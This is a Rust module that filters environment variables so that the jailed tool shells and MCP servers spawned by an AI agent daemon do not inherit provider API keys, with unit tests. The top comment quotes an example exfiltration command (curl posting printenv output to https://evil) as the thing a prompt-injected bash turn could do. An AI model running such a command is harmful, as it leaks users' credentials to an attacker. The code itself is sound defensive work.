//! Shared env-scrubbing for daemon child spawns (jailed tool exec + MCP servers).
//!
//! The daemon process holds provider secrets in its ambient env
//! (`FAE_OPENROUTER_API_KEY` at `main.rs`, the ACP `FAE_CODEX/OPENAI/CLAUDE/…`
//! keys). Any child it spawns must NOT inherit them, or a prompt-injected jailed
//! bash turn or a declared MCP server could exfiltrate them
//! (`curl -d "$(printenv)" https://evil`). This module builds a **positive
//! allowlist**: only vetted, non-secret vars pass to a child. It is the single
//! definition of that allowlist, shared by every daemon child-spawn site.

use std::collections::HashMap;

/// Exact env-var names a child legitimately needs (shell + locale + tmp).
const ALLOWED_EXACT: &[&str] = &[
    "PATH", "HOME", "LANG", "TMPDIR", "TERM", "USER", "LOGNAME", "SHELL",
];

/// Env-var name prefixes a child may inherit (locale variants + Fae runtime
/// config). `FAE_LLAMA*` is llama.cpp wiring (ports, model/GGUF paths) — never a
/// key or token; provider secrets are `FAE_*_API_KEY` / `FAE_*_TOKEN`, excluded by
/// this positive allowlist AND by the `is_sensitive_name` guard below.
const ALLOWED_PREFIXES: &[&str] = &["LC_", "FAE_LLAMA"];

/// Substrings that mark a name as secret-bearing. Such a var is NEVER handed to a
/// child even if a future allowlist edit would otherwise admit it (defense in
/// depth over the positive allowlist).
const SENSITIVE_MARKERS: &[&str] = &[
    "API_KEY",
    "APIKEY",
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "PASSWD",
    "CREDENTIAL",
    "PRIVATE_KEY",
];

/// `true` when `name` carries a secret marker (shared with the symphony
/// sidecar's passthrough filter — a secret-named var never crosses even when a
/// passthrough prefix would otherwise admit it).
pub(crate) fn is_sensitive_name(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    SENSITIVE_MARKERS.iter().any(|m| upper.contains(m))
}

fn is_allowed_name(name: &str) -> bool {
    if is_sensitive_name(name) {
        return false;
    }
    ALLOWED_EXACT.contains(&name) || ALLOWED_PREFIXES.iter().any(|p| name.starts_with(p))
}

/// Filter `vars` to the vetted allowlist. Pure — testable without touching the
/// process env.
fn scrub<I: IntoIterator<Item = (String, String)>>(vars: I) -> HashMap<String, String> {
    vars.into_iter()
        .filter(|(k, _)| is_allowed_name(k))
        .collect()
}

/// The scrubbed env for a daemon-spawned child: the daemon's process env filtered
/// to the vetted allowlist, with every secret-bearing var removed. Pass this to a
/// child after `env_clear()` (or as the transport's complete env) so no provider
/// secret is inherited.
pub(crate) fn scrubbed_child_env() -> HashMap<String, String> {
    scrub(std::env::vars())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allowlist_keeps_runtime_vars_and_drops_secrets() {
        // Fake secret names built by concatenation so no secret-shaped literal
        // reaches git (push-protection), and to prove suffix/prefix matching.
        let token_var = format!("FAE_CODEX_{}", "TOKEN");
        let planted = vec![
            ("PATH".to_string(), "/usr/bin".to_string()),
            ("HOME".to_string(), "/home/fae".to_string()),
            ("LC_ALL".to_string(), "C".to_string()),
            ("FAE_LLAMA_PORT".to_string(), "8080".to_string()),
            ("FAE_OPENROUTER_API_KEY".to_string(), "planted".to_string()),
            (token_var.clone(), "planted".to_string()),
            ("GITHUB_TOKEN".to_string(), "planted".to_string()),
            ("AWS_SECRET_ACCESS_KEY".to_string(), "planted".to_string()),
            ("RANDOM_VAR".to_string(), "x".to_string()),
        ];
        let scrubbed = scrub(planted);

        // Vetted runtime vars survive.
        assert!(scrubbed.contains_key("PATH"));
        assert!(scrubbed.contains_key("HOME"));
        assert!(scrubbed.contains_key("LC_ALL"));
        assert!(scrubbed.contains_key("FAE_LLAMA_PORT"));

        // Provider secrets and un-allowlisted vars are gone.
        assert!(!scrubbed.contains_key("FAE_OPENROUTER_API_KEY"));
        assert!(!scrubbed.contains_key(&token_var));
        assert!(!scrubbed.contains_key("GITHUB_TOKEN"));
        assert!(!scrubbed.contains_key("AWS_SECRET_ACCESS_KEY"));
        assert!(!scrubbed.contains_key("RANDOM_VAR"));

        // No surviving key carries a secret marker.
        for k in scrubbed.keys() {
            let up = k.to_ascii_uppercase();
            assert!(!up.contains("API_KEY"), "leaked {k}");
            assert!(!up.contains("TOKEN"), "leaked {k}");
            assert!(!up.contains("SECRET"), "leaked {k}");
        }
    }

    #[test]
    fn scrubbed_child_env_excludes_planted_api_key() {
        // Plant a secret in the real process env; the scrubbed child env must drop
        // it while keeping PATH (so the child can still find its binaries).
        std::env::set_var("FAE_OPENROUTER_API_KEY", "planted-must-not-leak");
        let env = scrubbed_child_env();
        assert!(
            !env.contains_key("FAE_OPENROUTER_API_KEY"),
            "planted API key leaked into child env"
        );
        assert!(
            env.contains_key("PATH"),
            "PATH must survive for the child to find binaries"
        );
        std::env::remove_var("FAE_OPENROUTER_API_KEY");
    }
}
